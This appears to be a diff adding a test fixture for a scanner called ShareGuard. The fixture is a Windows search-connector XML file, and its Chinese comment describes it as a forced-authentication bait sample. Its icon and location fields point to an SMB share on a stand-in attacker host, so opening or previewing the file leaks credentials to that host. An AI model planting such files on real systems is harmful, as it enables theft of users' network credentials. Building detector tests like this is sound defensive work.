@@ -1,0 +1,16 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!--
+  强制认证诱饵样本 —— .searchConnector-ms (搜索连接器)
+  攻击面:
+    simpleLocation/url 指向攻击者 SMB 共享,用户在资源管理器侧栏点开
+    连接器(甚至只是预览)即发起连接;iconReference 在渲染时外发认证。
+  ShareGuard 不依赖完整 XML 解析,正则提取所有属性值与文本节点中的
+  UNC/URL,畸形/截断的 XML 也能恢复出引用。
+-->
+<searchConnectorDescription xmlns="http://schemas.microsoft.com/windows/2009/searchconnector">
+  <isSearchOnlyFromSuggestedLocations>false</isSearchOnlyFromSuggestedLocations>
+  <iconReference>\\attacker.example.org\icons\search.ico</iconReference>
+  <simpleLocation>
+    <url>\\attacker.example.org\shared-docs</url>
+  </simpleLocation>
+</searchConnectorDescription>
